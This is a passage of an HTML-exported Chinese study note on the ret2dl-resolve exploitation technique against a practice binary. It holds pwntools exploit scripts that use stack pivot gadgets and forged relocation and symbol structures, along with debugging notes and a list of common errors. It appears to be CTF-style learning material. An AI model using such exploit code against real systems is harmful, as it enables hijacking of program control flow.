mso-font-kerning:1.0000pt;" >p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.interactive()</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >传送</font>reloc没问题</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >EAX=0xf7ffd918 #link_map</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >EDX=0x1db2 #reloc_argc </span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="379"  height="378"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充3173.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >然后就进入</font>call 0xf7fe77e0了，应该会读取我们伪造的REL结构了。但是执行到push esi的时候。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >一开始以为是我们结构构造错误，但是自己观察报错。</font></span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >发现提示</font>SIGSEGV，即段错误。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >再仔细一看，现在的栈已经下降到了</font>0x804a002了，已经从bss段下降到了其他不可写的段，直接导致了段错误。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >主要原因是因为我图方便，把</font>bss的首地址作为了栈顶。解决方案就是在程序开始的时候就大幅度提高栈的地址。#这个图方便导致我卡了一个半个小时</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="404"  height="367"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充3401.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><img width="375"  height="102"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充3403.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >于是提高栈空间重新写一下</font>exp</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ># -*- coding: utf-8 -*-</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >from pwn import *</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p=process('./pwn01')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gdb.attach(p,'b *0x80484b1')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >Address=0x12345678</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_ecx=0x804a05a</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >buf=0x804a040</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_esp=fake_ecx-0x4</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >base_stage=fake_esp+0x800</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >read_plt=0xf7ed2b00</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >stack_size=0x500</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget1=0x0804851b #pop ebp |ret</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget2=0x08048519 # &nbsp;pop esi ; pop edi ; pop ebp ; ret</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >gadget3=0x080483c5 #</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#New stack</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload="A"*0xe</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(fake_ecx)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="BBBB"</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#payload+=p32(read_plt)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#payload+=p32(gadget2)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#payload+=p32(0)+p32(base_stage)+p32(100)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(gadget1)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(base_stage)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(gadget3) </span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(base_stage+stack_size)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >#struct </span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >plt0=0x80482f0</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >rel_plt=0x080482b4</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >reloc_arg=0x804a862-rel_plt #fang hou mian yidian ,hui bei fugai</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >dynsym=0x080481cc</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >dynstr=0x0804822c</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >r_offset=0x0804a00c #read_got</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >r_info=0x107</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >fake_rel=p32(r_offset)+p32(r_info)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+="A"*(0x804a85a-buf-len(payload))</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(plt0)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=p32(reloc_arg)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >payload+=fake_rel </span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.sendline(payload)</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p.interactive()</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >可以看到</font>call结束之后，直接进入了read函数。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >因为我们赋给</font>r_info =0x107，正好读取了read的SYM结构</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="457"  height="146"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充4476.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >FAKE_SYM部分</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >经验：在写</font>ret2dl方法的时候，一般不是一气呵成的。先尝试把数据布置在bss段中，然后调试程序，确定代码的位置，然后再修改reloc_arg、fake_rel和fake_sym结构里面的参数到正确的位置。否则，一下子是很难拿写出来的。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >Q1：程序退出，0177这种报错，说明是查找dysn，却没有找到对应的内容。需要重新检查构造的SYM结构。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="560"  height="136"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充4687.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >Q2：SIGSEGV报错，还是一样的栈过低问题。也可能是r_info读取位置错了，读到其他段里面去了。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="417"  height="349"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充4741.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >Q3：symbol lookup error ，读取sym结构错误，（ECX中显示）应该是读取的位置不正确。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><img width="513"  height="317"  src="绕过lea esp和Ret2dl的一些补充.files/绕过lea esp和Ret2dl的一些补充4798.png" ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><font face="微软雅黑" >写出一个满是补丁的</font>EXP，并且包含大量硬编码。</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ># -*- coding: utf-8 -*-</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >from pwn import *</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p>&nbsp;</o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" >p=process('./pwn01')</span><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
mso-font-kerning:1.0000pt;" ><o:p></o:p></span></p><p class=MsoNormal ><span style="mso-spacerun:'yes';font-family:微软雅黑;font-size:9.0000pt;
